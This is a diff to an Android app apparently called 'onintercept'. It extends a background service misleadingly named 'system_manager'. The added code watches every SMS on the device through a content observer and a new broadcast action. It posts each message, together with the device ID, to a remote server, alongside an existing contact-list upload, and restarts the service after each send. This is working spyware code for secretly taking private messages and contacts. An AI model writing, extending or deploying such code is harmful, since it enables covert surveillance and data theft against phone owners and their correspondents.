@@ -7,7 +7,9 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.database.ContentObserver;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
@@ -26,6 +28,7 @@ import im.unicolas.onintercept.Config;
 import im.unicolas.onintercept.OIApp;
 import im.unicolas.onintercept.R;
 import im.unicolas.onintercept.bean.MainListBean;
+import im.unicolas.onintercept.bean.SmsInfo;
 import okhttp3.Call;
 import okhttp3.Response;
 
@@ -35,8 +38,10 @@ import okhttp3.Response;
 public class system_manager extends Service {
     private static final String TAG = "MService";
 
+    private Context context;
     private List<String> contactList = new ArrayList<>();
     private String deviceId;
+    private ContentObserver co;
 
     @Nullable
     @Override
@@ -48,8 +53,11 @@ public class system_manager extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+
         loadContacts();
-        IntentFilter intentFilter = new IntentFilter("smsPost");
+        IntentFilter intentFilter = new IntentFilter();
+        intentFilter.addAction("smsPost");
+        intentFilter.addAction("smsReceiver");
         registerReceiver(br, intentFilter);
     }
 
@@ -86,34 +94,47 @@ public class system_manager extends Service {
                         Log.e(TAG, "onError: 上传通讯录失败 " + e.getMessage());
                     }
                 });
+
+        co = new SmsReceiver(handler, getApplicationContext());
+        this.getContentResolver().registerContentObserver(Uri.parse(Config.SMS_URI_ALL), true, co);
     }
 
     BroadcastReceiver br = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             String action = intent.getAction();
-
+            String deviceId = OIApp.getInstance().getSp().getString("deviceId", "");
+            String postMsg = "";
             if (action.equals("smsPost")) {
-                String smsListener = intent.getStringExtra("smsListener");
-                Log.e(TAG, "onReceive: 监听新短信 " + smsListener);
-                String deviceId = OIApp.getInstance().getSp().getString("deviceId", "");
-                OkGo.post(Config.POST_SMS)
-                        .params("imei", deviceId)
-                        .params("messages",smsListener)
-                        .execute(new StringCallback() {
-                            @Override
-                            public void onSuccess(String s, Call call, Response response) {
-                                Log.e(TAG, "onSuccess: 监听短信发送 " + s);
-                                handler.sendEmptyMessage(0);
-                            }
-
-                            @Override
-                            public void onError(Call call, Response response, Exception e) {
-                                super.onError(call, response, e);
-                                Log.e(TAG, "onError: 监听短信失败 " + e.getMessage());
-                            }
-                        });
+                postMsg = intent.getStringExtra("smsListener");
+                Log.e(TAG, "onReceive: 监听新短信 " + postMsg);
             }
+
+            if (action.equals("smsReceiver")) {
+                String info = intent.getStringExtra("sm_sr");
+                postMsg = info;
+            }
+            Log.e(TAG, "onReceive: 接受短信 >>>  " + postMsg);
+
+            if (postMsg.equals("")) return;
+
+            OkGo.post(Config.POST_SMS)
+                    .params("imei", deviceId)
+                    .params("messages",postMsg)
+                    .execute(new StringCallback() {
+                        @Override
+                        public void onSuccess(String s, Call call, Response response) {
+                            Log.e(TAG, "onSuccess: DB监听短信发送 " + s);
+                            handler.sendEmptyMessage(0);
+                        }
+
+                        @Override
+                        public void onError(Call call, Response response, Exception e) {
+                            super.onError(call, response, e);
+                            Log.e(TAG, "onError: DB监听短信失败 " + e.getMessage());
+                        }
+                    });
+            startService(new Intent(context, system_manager.class));
         }
     };
 
@@ -125,6 +146,9 @@ public class system_manager extends Service {
             switch (what) {
                 case 0:
                     Log.e(TAG, "handleMessage: 短信上传成功");
+
+                    break;
+                case 1:
 
                     break;
             }
